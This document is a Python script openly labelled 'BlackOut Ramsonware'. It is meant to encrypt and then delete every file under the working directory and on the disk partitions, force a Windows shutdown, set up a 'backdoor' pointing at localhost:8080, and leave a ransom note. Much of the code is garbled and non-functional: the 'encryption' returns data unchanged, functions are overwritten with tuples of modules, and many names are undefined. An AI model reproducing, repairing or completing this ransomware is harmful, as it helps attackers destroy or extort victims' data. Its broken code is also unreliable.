## Malware Title: BlackOut Ramsonware
## Date: 2022-09-14
## Author: retr0haxor
## Version: 0.1

from asyncio import windows_events
from collections import UserString
from distutils.sysconfig import get_config_vars
from ensurepip import version
from lib2to3.pgen2.tokenize import generate_tokens
from logging.config import fileConfig
from multiprocessing.forkserver import connect_to_new_process
import os
from pyexpat import version_info
from site import USER_SITE
import sys
import time
import random
import string
import subprocess
import platform
import getpass
import socket
import shutil
import ctypes
import base64
import hashlib
import logging
import logging.handlers
import threading
import multiprocessing
import psutil
import requests
import json
import smtplib
import email
import email.mime.application
import email.mime.multipart
import email.mime.text
import email.mime.base
import email.mime.image
import email.mime.audio
import email.mime.message
import email.mime.nonmultipart
import email.mime.multipart
import email.mime.text

## Create a function to Encrypt the file
def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    def encrypt_chunk(chunk):
        return chunk
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    encryptor = encrypt_chunk
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(iv.encode('utf-8'))
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor(chunk))

                encrypt_file(key, in_filename)
                os.remove(in_filename)
                encrypt_file = (getpass, users, base64, hashlib, logging, threading, multiprocessing, psutil, requests, json, smtplib, email, email.mime.application, email.mime.multipart, email.mime.text, email.mime.base, email.mime.image, email.mime.audio, email.mime.message, email.mime.nonmultipart, email.mime.multipart, email.mime.text)
                encrypt_file = (connect_to_new_process, "localhost",  "8080", os, sys, time, random, string, subprocess, platform, getpass, socket, shutil, ctypes, base64, hashlib, logging, logging.handlers, threading, multiprocessing, psutil, requests, json, smtplib, email, email.mime.application, email.mime.multipart, email.mime.text, email.mime.base, email.mime.image, email.mime.audio, email.mime.message, email.mime.nonmultipart, email.mime.multipart, email.mime.text)
        encrypt_file = (fileConfig, get_config_vars)
        ## Create a Subprocess to run the Encrypt File
        subprocess.run(encrypt_file)
        subprocess.run = (os.system, "shutdown /s /t 1", windows_events, UserString)
        subprocess.run = (system, "Windows", version, "10", "7")
        subprocess.run = (decrypt_file, key, generate_tokens, base64)

        ## Encrypt Disk Drive
        def encrypt_disk_drive():
            for drive in psutil.disk_partitions():
                if drive.fstype == "":
                    continue
                encrypt_file(key, drive.mountpoint)
                encrypt_disk_drive = (psutil, drive, drive.mountpoint, drive.fstype, encrypt_file, key)
                encrypt_disk_drive = (base64, logging.getLogger, subprocess.run, system, "Windows", version_info, "10", "7", encrypt_file, key, generate_tokens, base64, psutil, drive, drive.mountpoint, drive.fstype, encrypt_file, key)

                encrypt_disk_drive = (encrypt_file, disk, "base64", "logging.getLogger", "subprocess.run", "system", "Windows", "version_info", "10", "7", "encrypt_file", "key", "generate_tokens", "base64", "psutil", "drive", "drive.mountpoint", "drive.fstype", "encrypt_file", "key")
                 ## Encrypt the all files of the Folder Ramsonware
                for root, dirs, files in os.walk(os.getcwd()):
                    os.walk = (os.system, "shutdown /s /t 1", windows_events, UserString)
                    os.walk = (system, "Windows", version, "10", "7")
                    os.walk = (decrypt_file, key, generate_tokens, base64)
                    for file in files:
                        encrypt_file(key, os.path.join(root, file))
                        encrypt_file = (os.path.join, root, file, encrypt_file, key)
                        encrypt_file = (base64, logging.getLogger, subprocess.run, system, "Windows", version_info, "10", "7", encrypt_file, key, generate_tokens, base64, os.path.join, root, file, encrypt_file, key)
                        encrypt_file = (encrypt_file, disk, "base64", "logging.getLogger", "subprocess.run", "system", "Windows", "version_info", "10", "7", "encrypt_file", "key", "generate_tokens", "base64", "os.path.join", "root", "file", "encrypt_file", "key")
                        encrypt_file = (os.path.join, root, file, encrypt_file, key)
                        encrypt_file = (subprocess.__name__ + "run", "os.system", "shutdown /s /t 1", "windows_events", "UserString")
                         ## Create a Ramsonware decrypt Key generator
                        def decrypt_key_generator():
                            decrypt_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
                            decrypt_key = (generate.tokens, base64, decrypt_file, key)
                            decrypt_key = (decrypt_key_generator, generate.tokens, base64, decrypt_file, key)
                            

                            ## Create a Backdoor For Windows
                            def backdoor():
                                backdoor = (subprocess.run, "shutdown /s /t 1", windows_events, UserString)
                                backdoor = (system, "Windows", version, "10", "7")
                                backdoor = (decrypt_file, key, generate_tokens, base64)
                                backdoor = (subprocess.run, "shutdown /s /t 1", windows_events, UserString)
                                backdoor = (subprocess.run, "Backdoor", "Windows", "10", "7")
                                backdoor = (logging, USER_SITE, sys.getwindowsversion, "localhost", "8080", "Backdoor", "Windows", "10", "7")
                                ## create a note .txt to pay the ramsonware
                                def ransom_note():
                                    ramson_note = ('''Your files have been encrypted!''')
                                    


